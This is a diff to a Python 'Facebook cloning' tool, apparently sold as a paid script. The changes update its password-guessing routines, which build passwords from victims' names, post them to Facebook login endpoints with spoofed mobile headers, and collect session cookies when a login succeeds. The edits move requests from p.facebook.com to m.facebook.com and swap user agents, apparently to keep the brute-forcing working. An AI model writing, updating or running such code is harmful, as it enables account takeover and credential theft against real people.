@@ -117,7 +117,7 @@ logo=("""\033[1;32m
 {+}\033[1;32mCREATED BY     : \033[1;32mAB KHANX\033[1;32m
 {+}\033[1;32mFACEBOOK       : \033[1;32mAB KHANX\033[1;32m
 {+}\033[1;32mYOUTUBE        : \033[1;32mMSS TRICKS\033[1;32m
-{+}\033[1;32mVERSION        :\033[1;32m 7.0\033[1;32m
+{+}\033[1;32mVERSION        :\033[1;32m 8.0\033[1;32m
 {+}\033[1;32mSTATUS         :\033[1;32m PAID\033[1;32m
 --------------------------------------------------
 \033[1;37m[-]KINGX MR SW4T1
@@ -729,7 +729,7 @@ def ffb(ids,names,passlist):
 		for fikr in passlist:
 			pas = fikr.replace('First',first).replace('Last',last).replace('first',ps).replace('last',ps2)
 			ua=random.choice(ugen)
-			head = {'Host': 'p.facebook.com', 'viewport-width': '980', 'sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="100", "Google Chrome";v="100"', 'sec-ch-ua-mobile': '?1', 'sec-ch-ua-platform':'"Android"', 'sec-ch-prefers-color-scheme': 'light', 'dnt': '1', 'upgrade-insecure-requests': '1', 'user-agent': 'Mozilla/5.0 (Linux; Android 10; SM-G980F Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/78.0.3904.96 Mobile Safari/537.36', 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9', 'sec-fetch-site': 'none', 'sec-fetch-mode': 'navigate', 'sec-fetch-user': '?1', 'sec-fetch-dest': 'document', 'accept-encoding': 'gzip, deflate, br', 'accept-language': 'en-US,en;q=0.9'}
+			head = {'Host': 'p.facebook.com', 'viewport-width': '980', 'sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="100", "Google Chrome";v="100"', 'sec-ch-ua-mobile': '?1', 'sec-ch-ua-platform':'"Android"', 'sec-ch-prefers-color-scheme': 'light', 'dnt': '1', 'upgrade-insecure-requests': '1', 'user-agent': 'Mozilla/5.0 (Linux; Android 7.0; Infinix X559C Build/NRD90M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.137 Mobile Safari/537.36', 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9', 'sec-fetch-site': 'none', 'sec-fetch-mode': 'navigate', 'sec-fetch-user': '?1', 'sec-fetch-dest': 'document', 'accept-encoding': 'gzip, deflate, br', 'accept-language': 'en-US,en;q=0.9'}
 			getlog = session.get(f'https://p.facebook.com/login/device-based/password/?uid={ids}&flow=login_no_pin&refsrc=deprecated&_rdr')
 			idpass ={"lsd":re.search('name="lsd" value="(.*?)"', str(getlog.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(getlog.text)).group(1),"uid":ids,"next":"https://p.facebook.com/login/save-device/","flow":"login_no_pin","pass":pas,}
 			complete = session.post('https://p.facebook.com/login/device-based/validate-password/?shbl=0',data=idpass,allow_redirects=False,headers=head)
@@ -844,12 +844,13 @@ def rcrack(ids,passlist):
 			"email":ids,
 			"pass":pas,
 			"login":"Log In"}
-			header_freefb = {'authority':'p.facebook.com',
-		    'method': 'POST',
+			header_freefb = {'authority':'m.facebook.com',
+		    'method': 'GET',
             'scheme': 'https',
             'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
             'accept-language': 'en-US,en;q=0.9,ur-PK;q=0.8,ur;q=0.7,fa-IR;q=0.6,fa;q=0.5',
             'cache-control': 'max-age=0',
+            # 'cookie': 'datr=iXhDZM7D9Q4uCWBkwVbonbt5; sb=iXhDZNy23aAZcqXNj-Rxk_RQ; m_pixel_ratio=2; wd=360x680; fr=00Yhq7q6B2upcCHWz..BkQ3iJ.fX.AAA.0.0.BkQ3im.AWXGu1f3uD4',
             'sec-ch-ua': '"Chromium";v="111", "Not(A:Brand";v="8"',
             'sec-ch-ua-mobile': '?1',
             'sec-ch-ua-platform': '"Android"',
@@ -859,7 +860,7 @@ def rcrack(ids,passlist):
             'sec-fetch-user': '?1',
             'upgrade-insecure-requests': '1',
             'user-agent': 'Mozilla/5.0 (Mobile; rv:48.0; A405DL) Gecko/48.0 Firefox/48.0 KAIOS/2.5',}
-			lo = session.post('https://p.facebook.com/login/device-based/regular/login/?refsrc=deprecated&lwv=100&refid=8',data=log_data,headers=header_freefb).text
+			lo = session.post('https://m.facebook.com/login/device-based/regular/login/?refsrc=deprecated&lwv=100&refid=8',data=log_data,headers=header_freefb).text
 			log_cookies=session.cookies.get_dict().keys()
 			if 'c_user' in log_cookies:
 				coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
@@ -912,7 +913,7 @@ def menu_apikey():
 {+}\033[1;32mCREATED BY     : \033[1;32mAB KHANX\033[1;32m
 (+}\033[1;32mFACEBOOK       : \033[1;32mAB KHANX\033[1;32m
 {+}\033[1;32mYOUTUBE        : \033[1;32mMSS TRICKS\033[1;32m
-{+}\033[1;32mVERSION        :\033[1;32m 7.0\033[1;32m
+{+}\033[1;32mVERSION        :\033[1;32m 8.0\033[1;32m
 {+}\033[1;32mSTATUS         :\033[1;32m PAID\033[1;32m
 --------------------------------------------------
 \033[1;33m[+]TOOLS  : FACEBOOK CLONING 
